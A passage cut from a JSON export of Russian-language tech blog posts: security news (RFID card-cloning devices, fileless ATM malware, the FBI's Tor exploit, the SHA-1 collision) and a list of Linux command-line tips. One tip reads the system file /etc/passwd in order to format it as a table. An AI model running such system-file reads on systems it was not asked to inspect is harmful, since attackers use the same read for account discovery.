могу.\n![](https://habrastorage.org/files/b02/eb6/1f8/b02eb61f8914439bb3fc622806da0a46.jpg)\n\nВ любом случае, ближайшие пару дней мы увидим еще не одну байку о том, что же видят на самом деле представители админстрации вконтакте. Но интереснее всего то, кто все-таки имеет доступ к приватным фотографиям пользователей, и действительно ли доступны видны запросы, которые вы отправляете в ВК, любому зеваке, попавшему в команду модераторов ВК?\n\nСтоит отметить, что ВК любит радовать своих пользователей. Я уже несколько раз описывал некоторые уязвимости в Вконтакте, которые помогают настраивать мне более эффективную рекламу здесь и здесь. А мой коллега, даже решил выложить подробное руководство о том, как получать бесплатные клики из ВК . Совсем недавно администрация ВК забыла продлить домен, хранящий большинство фотографий пользователей, в связи с чем эти самые фотографии оказались недоступными на несколько дней, в то время как администрация судорожно переподключало новый домен. Или вот однажды Вк добавили на счет каждому пользователю рекламного кабинета сумму, равную его затратам за всю историю работы с ВК. \n\nНо такого веселого и масштабного факапа я еще не видел.\n\nUPDATE! Если отправить в личные сообщения скрин с некоторыми фото этого факапа — картинка удалится в течение нескольких секунд. Пруф:\n![](https://habrastorage.org/files/90a/57d/5f2/90a57d5f2d0a4519bf3e81cf074cf41c.png)\n\n[отсюда](https://habrahabr.ru/post/324446/)"
		},
		{
			"post_id": 56,
			"title": "Начались продажи устройства для клонирования кредитных карт, лежащих в чужом кармане",
			"date_published": 1490113435.289,
			"body": "Хакерская группа CC Buddies начала продажи устройства, позволяющего на расстоянии 15 см моментально «клонировать» кредитные карты, оснащенные RFID-чипами. Устройство легко спрятать под одеждой и очень трудно обнаружить. Свое изделие злоумышленники продают в открытую: сайт доступен всем желающим. Ранее для подобных «сервисов» использовался даркнет.\nБольшой апгрейд\n---\nГруппа хакеров под названием CC Buddies начала открытую продажу вредоносного устройства для бесконтактного считывания и клонирования кредитных карт, оборудованных RFID-чипами. Новое устройство способно копировать 21 кредитную карту в секунду.\n\nВ 2016 г. те же злоумышленники продавали похожее устройство, но с более скромными характеристиками: их Infusion X5 позволял клонировать до 15 карт в секунду. Для успешного клонирования необходимо было, чтобы устройство располагалось очень близко от карты - не более 8 см. Новый вариант, получивший название X6, работает с расстояния 15 см.\n\nБлизкий недружественный контакт\n\nДля считывания карт требуется тесный контакт с потенциальной жертвой; однако в общественном транспорте в час пик, когда люди вынужденно прижимаются друг к другу, у злоумышленников, вооруженных подобными устройствами, появляется шанс на богатый улов. Шанс этот уже был неплох, когда устройства работали с расстояния 8 см, и тем более хорош он оказывается, когда рабочее расстояние возрастает вдвое.\n\nСамо устройство невелико и снабжено крепежом на руку, так что его без труда можно спрятать под длинным рукавом. Это делает его вдвойне опасным: вероятность его обнаружения стремится к нулю.\n\nНо даже при поимке злоумышленника, доказать факт преступления будет непросто, поскольку X6 оборудовано средствами шифрования хранящихся данных.\n\nНедешевая «игрушка»\n\nСобранные данные карт хранятся прямо в памяти устройства, на компьютер их можно передать с помощью USB-кабеля.\n\nДанные клонированных карт - ходовой товар на киберкриминальном рынке. С их помощью преступники делают фальшивые дебетовые карты, чем активно занимаются и сами CC Buddies.\n\nX6 предлагается за 1,5 биткоина, что примерно соответствует $1700 на нынешний момент. За дополнительные карты предлагается заплатить еще 0,1 биткоина.\n\nИнтересно, что CC Buddies развернули сайт для своего сервиса в «обычном» интернете, а не в даркнете, как это было раньше. Несколько других групп, занимающихся сходным промыслом, продолжают работать в даркнете.\n\nКак защититься?\n\n«Говоря о защите от подобных устройств, стоит вспомнить теорию волн из физики. Судя по техническим описаниям предшественника данного устройства оно работает на частоте 13,5 МГц, что является короткой волной. Короткие волны характеризуются небольшой длинной волны, но при этом высокой частой колебаний, что сказывается на их проникающую способность через препятствия, - говорит Георгий Лагода, технический директор компании \"Монитор Безопасности\". - Однако, стоит понимать, что заявленное расстояние копирования в 15 см, скорее всего имеет место в однородной воздушной среде без препятствий (в том числе, одежда, кошелек, другие карточки и т.д.), посему наибольшая вероятность успешного копирования чужой карточки злоумышленником появляется при непосредственном контакте данного устройства с картой жертвы».\n\nПо словам Лагоды, зачастую рядом с пластиковыми картами могут находиться строение излучатели - электронные пропуска и другие карты, что может создавать дополнительные помехи потенциальным злоумышленникам. В любом случае, считает Лагода, необходимо минимизировать вероятность «прямого контакта» карты с RFID-чипом с другими людьми.\n\nТакже стоит отметить, что безопасность таких карт напрямую зависит от стандартов безопасности их производителей, - отметил Георгий Лагода.\n\nАдрес новости: http://safe.cnews.ru/news/top/2017-03-20_nachalis_prodazhi_ustrojstva_dlya_klonirovaniya"
		},
		{
			"post_id": 55,
			"title": "Банкоматы подхватили вирус",
			"date_published": 1490110722.531,
			"body": "Мошенники атакуют их бесконтактно\n![](http://im8.kommersant.ru/Issues.photo/DAILY/2017/046M/KMO_120232_15594_1_t218_205934.jpg)\nВ России появился новый вирус, атакующий банкоматы. Особенность в том, что проникает он в банкомат без какого-либо физического контакта, а выявить и устранить проблему сложно. Как выяснил \"Ъ\", цель вируса — не средства клиентов, а деньги в банкомате, который настраивается на выдачу всех самых крупных купюр любому, набравшему определенный код. Пока простой механизм борьбы не найден, банкам остается лишь повышать общий уровень безопасности своих сетей. Однако большинству игроков проще и дешевле застраховать банкоматы, что только подстегнет к распространению мошенничества.\n---\nВ пятницу замначальника ГУБЗИ ЦБ Артем Сычев сообщил о новом бесконтактном способе хищения денежных средств из банкоматов. \"Мы всегда, когда говорили о скимминге, отмечали, что злоумышленник должен поставить что-то на банкомат, теперь новая технология появилась\",— уточнил он, не раскрыв деталей, но сообщив, что информация о проблеме и возможности противодействия ей доведена до участников рынка (в рассылках FinCert).\n\nПо словам собеседников \"Ъ\", получивших рассылку, новый способ атак на банкоматы FinCert описал 15 марта. В ней сообщалось о так называемом бестелесном или бесфайловом вирусе, который \"живет\" в оперативной памяти банкомата. В рассылке отмечается, что в России в банкоматах он замечен впервые. Так как вирус не имеет файлового тела, его не видят антивирусы и он может жить в зараженном банкомате сколь угодно долго, поясняет один из собеседников \"Ъ\".\n\nВирус направлен на хищение средств непосредственно из банкомата, который при введении заданного кода выдает всю наличность из первой кассеты диспенсера, где хранятся самые крупные купюры (номиналом 1 тыс. или 5 тыс. руб.) — 40 штук. Получить средства может любой, кто введет код, но обычному человеку его подобрать сложно, слишком длительные попытки могут вызвать подозрение у служб безопасности банка, поясняют собеседники \"Ъ\".\n\nЕсли в России данную схему мошенники применили впервые, то в мире подобные случаи уже были. \"Хищение средств с помощью бесфайлового вируса под силу лишь профессиональным преступникам, поскольку тут необходимы достаточно серьезные технологии,— отмечает директор по методологии и стандартизации Positive Technologies Дмитрий Кузнецов.— Злоумышленники взламывают внешний контур сети банка, далее проникают в компьютер специалиста, отвечающего за банкоматную сеть, а оттуда вирус попадает в отдельный замкнутый контур банкоматной сети\".\n\nСобеседники \"Ъ\" в банках, получивших рассылку FinCert, рассказали, что в данном случае поражены были устройства крупнейшего производителя банкоматов — NCR. Но отказываться от этой марки банкиры не собираются, поскольку поражен таким образом может быть любой банкомат. \"Выявленная уязвимость нехарактерна для конкретного производителя, так как все банкоматы работают под Windows\",— говорит один из собеседников \"Ъ\".\n\nСпециалисты пока не нашли простого и эффективного способа борьбы с новым вирусом. \"При перезагрузке банкомата вирус, по идее, должен без следа удаляться из оперативной памяти,— отмечает начальник управления информационной безопасности ОТП-банка Сергей Чернокозинский.— Однако он может прописывать себя в специальный раздел автозагрузки операционной системы и при каждом перезапуске компьютера \"возрождаться\" вновь\". Постоянно перезагружать банкоматы — не выход из ситуации, отмечают банкиры. По их словам, перезагрузка банкомата занимает порядка пяти минут, то есть подобную процедуру невозможно провести незаметно для клиентов, к тому же банкомату, как и любому компьютеру, частые перезагрузки вредны.\n\nПока противоядие не найдено, банкирам остается не допускать заражения банкоматов. \"Чтобы уберечься от подобных проникновений, банки должны усилить защиту внешнего контура и банкоматной сети,— отмечает начальник управления по развитию систем самообслуживания Альфа-банка Максим Дарешин.— Однако особенность в том, что стоимость защиты хоста не зависит от количества банкоматов, подключенных к сети, сто или несколько тысяч\". \"В подобной ситуации банки с небольшими банкоматными сетями, сопоставив объем затрат и рисков, вряд ли охотно будут вкладывать средства в безопасность, предпочитая застраховать банкоматы от хищений\",— указывает собеседник \"Ъ\" в крупном банке, признавая, что такой подход, будет стимулировать мошенников и далее распространять новый вирус.\n\n[коммерсант.ru](http://kommersant.ru/doc/3247346)"
		},
		{
			"post_id": 54,
			"title": "Как хакнуть Bluetooth (видео)",
			"date_published": 1489516160.959,
			"body": "<iframe width=\"854\" height=\"480\" src=\"https://www.youtube.com/embed/BBqsVKMYz1I?list=FLZZdBlnvRX9vT614Io0LuPQ\" frameborder=\"0\" allowfullscreen></iframe>"
		},
		{
			"post_id": 53,
			"title": "Говорилка на python",
			"date_published": 1489514742.623,
			"body": "Вот тут https://github.com/tirsky/speechpro_wrapper небольшая программа способная говорить неплохим русским языком если ей подсунуть текст. \n\nНужен python3 и модули urllib3, requests к нему. \n"
		},
		{
			"post_id": 52,
			"title": "Сайт wikileaks.org опубликовал документы, подтверждающие использование вирусного ПО в атаках со стороны ЦРУ и АНБ",
			"date_published": 1489000099.407,
			"body": "[Ссылка на пресс-релиз и часть документов](https://wikileaks.org/ciav7p1/index.html)\n\n![](https://wikileaks.org/ciav7p1/logo.png)\n---\n\"Портал WikiLeaks на этой неделе опубликовал секретные материалы ЦРУ, в которых описаны инструменты для взлома мобильных телефонов, компьютеров и телевизоров. Согласно документам, сотрудники спецслужбы могут подставлять хакеров любой страны - имитируя взлом или любых систем. Также они используют вредоносные программы, против которых пока не существует защитных механизмов\",- писали СМИ.\nКак отмечает НТВ, \"WikiLeaks пока опубликовал только первую часть документов - более 8 тысяч страниц по киберразведке ЦРУ, озаглавив их «Год Зеро». Всего в распоряжении WikiLeaks оказалось несколько сотен миллионов строчек компьютерных кодов, созданных в Лэнгли и опробованных на целях по всему миру\".\n\n\"В опубликованных документах нашелся целый список IP адресов провайдеров из самых разных стран мира, которыми вполне могли пользоваться хакеры ведомства. Среди российских компаний там числятся «Сибирьтелеком», «Синтерра», КОМКОР, МТС и даже объединенный сервер Российской академии наук. А пять своих тестовых серверов для прослушки ЦРУ назвало PocketPutin\",- отмечает телеканал, изучив документы Wikileaks."
		},
		{
			"post_id": 50,
			"title": "Не стало знаменитого хакера Криса Касперски ака Николай Владимирович Лихачёв",
			"date_published": 1488958422.704,
			"body": "Как-то незаметно прошли новости о гибели Криса. Еще 18.02.2017 его не стало. Разбился 10.02.2017 при прыжке с парашютом. \n\nПрощай чувак. \n\n![фотка из вики](https://upload.wikimedia.org/wikipedia/commons/thumb/1/16/Portrait_of_Kris_Kaspersky.JPG/267px-Portrait_of_Kris_Kaspersky.JPG)\n\n[ссылка на вики](https://ru.wikipedia.org/wiki/%D0%9A%D1%80%D0%B8%D1%81_%D0%9A%D0%B0%D1%81%D0%BF%D0%B5%D1%80%D1%81%D0%BA%D0%B8)"
		},
		{
			"post_id": 49,
			"title": "Самые полезные приёмы работы в командной строке Linux (с хабра)",
			"date_published": 1488882888.041,
			"body": "Каждый, кто пользуется командной строкой Linux, встречался со списками полезных советов. Каждый знает, что повседневные дела вполне можно выполнять эффективнее, да только вот одно лишь это знание, не подкреплённое практикой, никому не приносит пользы.\n![](https://habrastorage.org/getpro/habr/post_images/845/928/8f7/8459288f755535c7435eb0961a4a9e9a.png)\n---\nКак выглядят типичные трудовые будни системного администратора, который сидит на Linux? Если абстрагироваться от всего, кроме набираемых на клавиатуре команд, то окажется, что команды эти постоянно повторяются. Всё выходит на уровень автоматизма. И, если даже в работе есть что улучшать, привычка противится новому. Как результат, немало времени уходит на то, чтобы делать так, как привычнее, а не так, как быстрее, и, после небольшого периода привыкания – удобнее. Помнить об этом, сознательно вводить в собственную практику новые полезные мелочи – значит профессионально расти и развиваться, значит – экономить время, которое можно много на что потратить.\n\nПеред вами – небольшой список полезных приёмов работы с командной строкой Linux. С некоторыми из них вы, возможно, уже знакомы, но успели их позабыть. А кое-что вполне может оказаться приятной находкой даже для знатоков. Хочется надеяться, что некоторые из них будут вам полезны и превратятся из «списка» в живые команды, которыми вы будете пользоваться каждый день.\n\n**Вывод результатов работы команд в виде таблицы**\n\nИногда вывод результатов работы команд выглядит как мешанина из беспорядочных строк. Найти то, что надо, в таких данных можно, но работать с ними неудобно. Например – что-то подобное можно получить в ответ на команду mount. Хорошо бы то же самое вывести в виде таблицы. И это не только возможно, но ещё и очень просто:\n```\nmount | column –t\n```\n![Результаты работы команды mount, оформленные в виде таблицы](https://habrastorage.org/getpro/habr/post_images/e2e/79f/42f/e2e79f42fb47d16a50d6fd596aadf8b5.png  \"Результаты работы команды mount, оформленные в виде таблицы\")\n\nПо умолчанию команда формирует табличное представление, ориентируясь на пробелы между словами. А что, если в качестве разделителей используются другие символы, вроде двоеточий? Например – в выводе cat /etc/passwd?\n\nУпорядочить можно и такие данные – достаточно указать символ-разделитель с параметром –s. Например, ниже приведена команда для символа «:».\n```\ncat /etc/passwd | column -t –s:\n```\n![Отформатированный вывод /etc/passwd](https://habrastorage.org/getpro/habr/post_images/ecd/07f/784/ecd07f7842efeeb3e35525ec2ed06c46.png \"Отформатированный вывод /etc/passwd\")\n\n**Многократный повтор команды до её успешного завершения**\n\nЕсли вы погуглите на эту тему, то обнаружите, что многие задают вопрос о том, как повторять команду до тех пор, пока она не будет успешно выполнена. Например, такое может быть полезным при пинге сервера до тех пор, пока он не откликнется, при проверке выгрузки файлов, или при опросе некоего URL до тех пор, пока он не окажется доступен.\n\nРешить подобную задачу поможет цикл while true. Выглядит всё это так:\n\n![Команда будет повторяться до её успешного завершения](https://habrastorage.org/getpro/habr/post_images/a9a/907/fbd/a9a907fbdf1a91c963f881202a43f805.png \"Команда будет повторяться до её успешного завершения\")\n\nВ этом примере конструкция >/dev/null 2>&1 перенаправляет вывод программы в /dev/null, включая и Standard Error, и Standard Out.\n\nВероятнее всего, это – один из самых полезных приёмов работы с командной строкой Linux.\n\n**Сортировка процессов по используемой памяти**\n\nТут всё просто:\n```\nps aux | sort -nk 4\n```\n\n![Отсортированный список процессов](https://habrastorage.org/getpro/habr/post_images/2f7/5ce/4ed/2f75ce4ed6dc91b18e7385632b12f045.png \"Отсортированный список процессов\")\n\n**Сортировка процессов по использованию ресурсов CPU**\n\nСортировка процессов по использованию CPU делается так:\n```\nps aux | sort -nk 3\n```\n![Отсортированный список процессов](https://habrastorage.org/getpro/habr/post_images/aed/1d6/04d/aed1d604dbbeb7d5115f2b77e6a45d5f.png \"Отсортированный список процессов\")\n\nДля того, чтобы вывести сведения об архитектуре, используйте команду getconf LONG_BIT.\n\n**Одновременный просмотр нескольких лог-файлов**\n\nДля просмотра лог-файлов вполне подходит команда tail, но иногда может понадобиться одновременная работа с несколькими подобными файлами. Для решения этой задачи подойдёт консольный инструмент multitail, который поддерживает выделение текста, фильтрацию и многие другие полезные возможности.\n![Работа с multitail](https://habrastorage.org/getpro/habr/post_images/f4a/024/1a2/f4a0241a2fce1d78a787e2e5298863d8.png \"Работа с multitail\")\n\nУстановить эту утилиту, если вы её у себя не найдёте, можно командой apt-get install multitail.\n\n**Возврат к предыдущей директории**\n\nДля того, чтобы вернуться к предыдущей директории, просто наберите cd –.\n\n**Мониторинг с регулярными интервалами**\n\nИспользование утилиты watch (например, watch df –h) поможет организовать наблюдение за выводом любой команды. Например, можно наблюдать за объёмом свободного пространства, и за тем, как он меняется.\n\nПожалуй, вы сами сможете найти подходящие сценарии для использования этой команды.\n\n**Продолжение выполнения программы после окончания сессии**\n\nКогда вы запускаете любую программу в фоне и закрываете консоль, программа тоже завершит работу. А что, если надо, чтобы программа работала и после закрытия оболочки?\n\nДля того, чтобы этого добиться, можно воспользоваться командой nohup, название которой расшифровывается как «no hang-up». Выглядит это так:\n```\nnohup wget site.com/file.zip\n```\nПожалуй, эта команда – одна из тех, о которой забывают чаще всего, открывая по несколько окон терминала только ради исполняющихся в них команд.\n![Команда nohup](https://habrastorage.org/getpro/habr/post_images/7e5/13c/765/7e513c7652e881e06ae82761e613c4cd.png \"Команда nohup\")\n\nВ примере, показанном на рисунке выше, в текущей директории будет создан файл nohup.out, содержащий вывод команды:\n\n![Файл nohup.out](https://habrastorage.org/getpro/habr/post_images/6a0/cb7/b1e/6a0cb7b1e11f84ac92e96a78a4fcd0dd.png \"Файл nohup.out\")\n\nПолезная штука, согласны?\n\n**Автоматический ответ yes или no**\n\nПредположим, вы хотите автоматизировать процесс, который требует от пользователя постоянно отвечать yes. Сделать это можно, используя команду yes:\n```\nyes | apt-get update\n```\nВозможно, вместо этого вы решите автоматизировать отрицательные ответы. Тут поможет такая конструкция:\n```\nyes no | command\n```\n![Автоматизация ответа YES](https://habrastorage.org/getpro/habr/post_images/4e0/738/57a/4e073857abd932b5e6e454351d017325.png \"Автоматизация ответа YES\")\n\n**Создание файла заданного размера**\n\nСоздавать файлы заданного размера можно, используя команду dd:\n```\ndd if=/dev/zero of=out.txt bs=1M count=10\n```\nВышеприведённая команда создаст файл размером 10 Мб, заполненный нулями.\n![Создание файла заданного размера](https://habrastorage.org/getpro/habr/post_images/ff5/6bd/400/ff56bd400a8f03bd85bbb07cf4951a73.png \"Создание файла заданного размера\")\n\n**Выполнение последней команды с root-привилегиями**\n\nИногда можно забыть ввести sudo перед командой, которой нужны root-привилегии. Вводить всё заново нет нужды – достаточно воспользоваться такой командой:\n```\nsudo !!\n```\n![Выполнение последней команды с root-привилегиями](https://habrastorage.org/getpro/habr/post_images/06f/cb0/6f9/06fcb06f900bd11cdfdfdc2fad76411f.png \"Выполнение последней команды с root-привилегиями\")\n\n**Создание протокола терминальной сессии**\n\nДля того, чтобы записать в файл всё, что было выведено в окне терминала, можно воспользоваться командой script.\n\nПосле выхода из сессии протокол будет записан в файл typescript.\n\n**Замена пробелов на знаки табуляции**\n\nВот команда, которая позволяет заменить пробелы на знаки табуляции:\n```\ncat geeks.txt | tr ':[space]:' '\\t' > out.txt\n```\nНа самом деле, она универсальна и умеет работать с любыми символами.\n\n**Замена строчных букв на прописные**\n\nА вот – пример вышеописанной команды для замены строчных букв в файле с текстом на прописные:\n```\ncat myfile | tr a-z A-Z > output.txt\n```\n![Замена строчных букв в файле на прописные](https://habrastorage.org/getpro/habr/post_images/f3f/4e3/58b/f3f4e358b02b7f348b579d6a114a6e48.png \"Замена строчных букв в файле на прописные\")\n\n**Автоматическое формирование списка аргументов для команд: xargs**\n\nУтилита xargs, пожалуй, достойна звания одной из самых полезных возможностей командной строки Linux. Её можно использовать для передачи вывода некоей команды в качестве аргумента для другой. Например, вот как можно выполнить поиск .png-файлов и сжать их, или сделать с ними что-нибудь ещё:\n```\nfind. -name *.png -type f -print | xargs tar -cvzf images.tar.gz\n```\nИли, возможно, у вас имеется файл со списком URL, и вы хотите загрузить ресурсы по этим адресам, или ещё как-то их обработать:\n```\ncat urls.txt | xargs wget\n```\nТут надо учитывать, что вывод первой команды передаётся в качестве аргумента в конце команды xargs. Если при конструировании второй команды надо явно указать место, куда должны попасть выходные данные первой, достаточно воспользоваться парой фигурных скобок, {} и параметром –i для замены аргумента в нужном месте:\n```\nls /etc/*.conf | xargs -i cp {} /home/likegeeks/Desktop/out\n```\n![Команда xargs](https://habrastorage.org/getpro/habr/post_images/bb8/c3b/516/bb8c3b51613c0bd20250dfe8888d1b41.png \"Команда xargs\")\n\nИтоги\n\nПолезности для командной строки Linux – тема невероятно обширная. Поэтому любой список, подобный нашему, можно пополнять очень и очень долго. Например, много неожиданного скрыто в командах awk и sed. Пожалуй, главное – чтобы такие вот списки шли в дело."
		},
		{
			"post_id": 48,
			"title": "Прокуратура США отказалась от иска по детской порнографии, чтобы не рассекретить эксплойт для браузера Tor.",
			"date_published": 1488824830.965,
			"body": "Федеральный прокурор Министерства юстиции США [попросил суд](https://www.documentcloud.org/documents/3482329-Michaud-motion-to-dismiss.html) прекратить слушания по делу о детской порнографии против пользователя, которого деанонимизировали в анонимной сети Tor. Хотя доказательства были убедительными, Минюст предпочёл отказаться от дела, лишь бы не выполнять требования суда — не выдавать исходный код эксплойта для браузера Tor. Юристы заявили, что исходники засекречены\n---\n![](https://habrastorage.org/files/221/490/47e/22149047e8224ddabd885daca9d6d200.jpg)\n\nТакая просьба со стороны прокуратуры намекает, что 0day-уязвимость в браузере Tor (и, скорее всего, Firefox) всё ещё не закрыта. Если рассекретить код, то её закроют Здесь просматривается некоторая двуличность ФБР и Министерства юстиции — они согласны, чтобы преступник остался безнаказанным. Лишь бы оставить незакрытую уязвимость на компьютерах миллионов пользователей — это слишком важно.\n\nПеред нами ещё одно свидетельство, что правительство использует 0day-уязвимости в популярных программах типа Firefox, удерживая эти уязвимости в секрете.\n\nМинистерство юстиции США вело судебный процесс против учителя средней школы Джея Мишо (Jay Michaud), посетителя порносайта Playpen в сети Tor. Это один из почти 200 похожих дел против пользователей сайтов детского порно, которые работали на серверах ФБР. Здесь всего лишь второй случай, когда прокуратура отказалась от иска.\n\nВ заявлении для суда от имени федерального прокурора Аннет Хайес (Annette Hayes) сказано дословно следующее: «Правительство теперь вынуждено выбирать между разглашением засекреченной информации и отказом от предъявления обвинения. Разглашение информации в данный момент не является вариантом. Отклонение судом иска с сохранением за истцом права на предъявление в дальнейшем иска по тому же основанию оставляет открытой возможность правительству выдвинуть новые обвинения до истечения срока исковой давности, когда правительство будет в состоянии предоставить запрошенные сведения».\n\n![](https://habrastorage.org/files/a94/99f/31c/a9499f31cd1f4b6ea1bc5895ab4c8b8c.png)\n\nФраза, что разглашение информации «в данный момент не является вариантом» и дальнейшее объяснение дают предположить, что 0day-уязвимость для Tor/Firefox по-прежнему в распоряжении ФБР. Хотя нельзя исключить возможность, что исходный код эксплойта «в данный момент» держится в тайне по каким-то другим причинам, но вариант с продолжением эксплуатации бага кажется наиболее логичным. Прокуратура говорит о возможности раскрытия эксплойта в будущем (читай: когда разработчики Firefox всё-таки докопаются до бага своими силами и закроют 0day).\n\nВ данный момент судят 137 граждан США, которых нашли благодаря сайту с детской порнографией Playpen — крупнейшему в мире ресурсу подобного рода. В начале 2015 года этот сайт [захватило ФБР и распространяло детскую порнографию 13 дней](https://geektimes.ru/post/269702/). ФБР поддерживало работу порносайта Playpen в скрытой сети Tor с 20 февраля по 4 марта 2015 года. В то время на нём было более 215 000 зарегистрированных пользователей и ссылки на более чем 23 000 фото- и видеоматериалов с детской порнографией, в том числе на 9000 файлов, которые размещались непосредственно на сервере ФБР. \n\nВо время операции сайт посетили более 100 000 зарегистрированных пользователей. По данным Министерства юстиции, ФБР смогло вычислить IP-адреса 1300 из них, а против 137 граждан заведены уголовные дела.\n\nВ прежние годы ФБР дважды проводило операции с захватом серверов с детской порнографией: в 2012 году оно переместило к себе три сайта с детским порно, а в 2013 году захватило и поддерживало работу хостинга Freedom Hosting в скрытой сети Tor. В 2013 году специалисты [проанализировали вредоносный Javascript-код](https://habrahabr.ru/post/194046/), установленный на сервер, — и выяснили, что он эксплуатирует уязвимость в браузере Firefox 17 ESR под Windows, на основе которого тогда был собран пакет Tor Browser Bundle.\n\nОчевидно, для новой операции был создан новый эксплойт, который использовал другую 0day-уязвимость в свежих версиях Firefox и Tor.\n\nTor Browser — официальная портативная сборка от The Tor Project, объединяющая Tor с Firefox ESR, включая аддоны NoScript, Torbutton и HTTPS Everywhere. Это самый популярный браузер для работы в сети Tor.\n\nАмериканская прокуратура в судебных документах называет этот эксплойт «сетевой следственной техникой» (network investigative technique, NIT), хотя в сфере информационной безопасности такие программы принято называть «зловредами».\n\nАдвокаты уже несколько раз пытались получить доступ к исходному коду NIT или его частям в рамках других разбирательств по делу Playpen. Дело в том, что все улики в любом деле должны быть добыты только законным путём. Соответственно, истец обязан убедительно объяснить, каким образом он добыл каждую улику. По этой причине в одном из дел прокуратура была вынуждена дать [краткое описание функционала NIT](https://www.documentcloud.org/documents/2166606-ferrell-warrant-1.html#document/p11/a227236), а в деле против Мишо в мае 2016 года судья уже постановил предоставить исходный код. Чтобы избежать выполнения судебных требований, правительству пришлось позже в 2016 году [засекретить сам исходный код (части кода)](https://www.documentcloud.org/documents/2901457-Response-in-Opposition-in-Darby.html#document/p22/a304432), то есть официально перевести его в разряд засекреченной информации.\n\nРассмотрение многих других дел против пользователей правительственного сайта с детской порнографией Playpen уже закончено. Об оправдательных приговорах ничего не известно. Судя по всему, все или почти все приговоры — обвинительные. Несколько дел по Playpen тянутся до сих пор, там где ответчики и их адвокаты подобрались особо упорные.\n\nСпециалист по безопасности Кристофер Согоян на хакерском конгрессе CCC [говорил](https://media.ccc.de/v/33c3-8136-stopping_law_enforcement_hacking#video&t=1563), что эти дела против Мишо и других важны ещё и потому, что если правительство выиграет по всем пунктам, то использование троянов и хакерских техник в глобальном (федеральном) масштабе станет самым дешёвым способом для правоохранительных органов вести расследование и собирать улики. Такая практика станет привычной — и тогда нам угрожает перспектива общества тотальной слежки и хаков. Шпионаж за людьми станет экстремально дешёвым и удобным для властей.\n\nС другой стороны, без таких эксплойтов власти могут проиграть борьбу с повсеместным переходом людей на шифрование трафика и использование криптографически защищённых инструментов. В этом случае поиск преступников станет гораздо более дорогим и трудоёмким.\n\nhttps://geektimes.ru/post/286608/"
		},
		{
			"post_id": 47,
			"title": "Только Google теоретически описал метод подделки SHA-1 как энтузиасты реализовали метод на практике. ",
			"date_published": 1488028972.014,
			"body": "При этом по расчетам Google что бы подделать хэш нужно немереное количество вычислительных мощностей и минимум год, то энтузиасты нашли решение как сделать все это практически мгновенно. \n---\nGoogle продемонстрировал первую успешную атаку на алгоритм хеширования SHA-1\n\nЧерез десять лет после начала использования алгоритма хэширования SHA-1 компания Google [объявила](https://security.googleblog.com/2017/02/announcing-first-sha1-collision.html) о первом практическом методе генерации коллизии для SHA-1. Результаты были получены после двух лет исследований, проведённых корпорацией совместно с институтом CWI в Амстердаме. В качестве доказательства возможности совершения атаки, компания Google [предоставила](https://shattered.it/) два PDF-файла, которые имеют одинаковые хеши SHA-1, но разное содержание.\n\nКоличество вычислений, необходимых для проведения разработанной в Google атаки, которая получила название SHAttered, ошеломляет: девять квинтильонов (9,223,372,036,854,775,808) операций подсчёта SHA-1 в общей сложности, которые потребовали бы 6500 лет вычислений на одном CPU или 110 лет вычислений на одном GPU. При этом на системе со 110 GPU усовершенствованная атака занимает примерно год. Для сравнения, применение метода полного перебора (brute force) в 100 тысяч раз медленнее и для нахождения коллизии за год потребуется 12 миллионов GPU. Для проведения атак не требуется каждый раз производить вычисления, например, для атаки на PDF [можно использовать](https://www.opennet.ru/opennews/art.shtml?num=46102) уже вычисленный типовой набор данных для вызова коллизии.\n\n![](https://www.opennet.ru/opennews/pics_base/0_1487876187.png)\n\nGoogle считает, что необходимо переходить на новые алгоритмы хеширования, такие как SHA-256 и SHA-3. Однако стоит отметить, что в настоящее время нет способов найти коллизии для хэшей MD5 и SHA-1 одновременно, что означает, что чтобы быть в безопасности все еще можно использовать старые доказанные хэш-функции, которые к тому же ускоряются аппаратно.\n\nВ рамках соглашения о раннем неразглашении уязвимостей, компания Google на 90 дней задержит публикацию практической реализации метода подбора коллизий (теоретическое описание уже [доступно](https://shattered.io/static/shattered.pdf)). После публикации кода для проведения атаки, им сможет воспользоваться любой желающий для создания одинаковых хэшей SHA-1 для разных PDF-файлов. Тем не менее для реализации защиты в настоящее время уже [опубликован](https://github.com/cr-marcstevens/sha1collisiondetection) код библиотеки и утилиты, позволяющих выдавать предупреждения для файлов, вызывающих коллизии в SHA-1.\n\nДополнение 1: По [мнению](http://marc.info/?l=git&m=148787047422954) Линуса Торвальдса, реальную степень угрозы для Git, в котором хэш SHA-1 используется для контроля целостности цепочки коммитов, можно будет оценить только после изучения кода для проведения атаки. Предварительно, Линус считает атаку на Git маловероятной, так как хэширование охватывает не только данные, но и заголовок, в котором указывается тип и размер. Таким образом атака существенно усложняется, так как потребуется не просто подобрать текст, вызывающий коллизию, но в этом тексте должен быть корректный заголовок, в котором указан правильный размер. В случае PDF атака упрощается, так как заголовок фиксирован и в файл можно вставить большие куски произвольных данных, которые не будут отображаться.\n\nДополнение 2: Компания Mozilla [объявила](https://blog.mozilla.org/security/2017/02/23/the-end-of-sha-1-on-the-public-web/) о расширении действия выборочного прекращения поддержки SHA-1 на всех пользователей Firefox 51. В Firefox 52 SHA-1 будет отключен по умолчанию. В Chrome поддержка SHA-1 уже прекращена ранее в январском выпуске (Chrome 56).\n\nДополнение 3: Энтузиасты не дожидаясь открытия кода эксплоита [создали](https://www.opennet.ru/opennews/art.shtml?num=46102) собственную реализацию метода, позволяющую создать разные PDF, выдающие один хэш SHA-1. В случае предложенной атаки на PDF, для создания двух PDF-файлов с одинаковыми хэшами SHA-1 больших вычислительных ресурсов не требуется, так как используется уже готовый набор данных для вызова коллизии. \n\n[ссылка на opennet](http://www.opennet.ru/opennews/art.shtml?num=46091)\n"
		},
		{
			"post_id": 46,
			"title": "Вставка видео в збложик. Забавные танцы с бубном",
			"date_published": 1488028712.339,
			"body": "Сегодня перепробовал массу различных вариантов вставки сюда видео. \n\nи через\n```\n<iframe> </iframe>\n```\nи через\n```\n![](ссылка на видео)\n```\nи только тег \n```\n<video> </video>\n```\nрешил проблему, и то в Chrome ни как было не отрубить автопроигрывание... \nХорошо что есть варианты, но зачем создавать такие проблемы? "
		},
		{
			"post_id": 45,
			"title": "Режим Core оффтопика (видео)",
			"date_published": 1488017287.584,
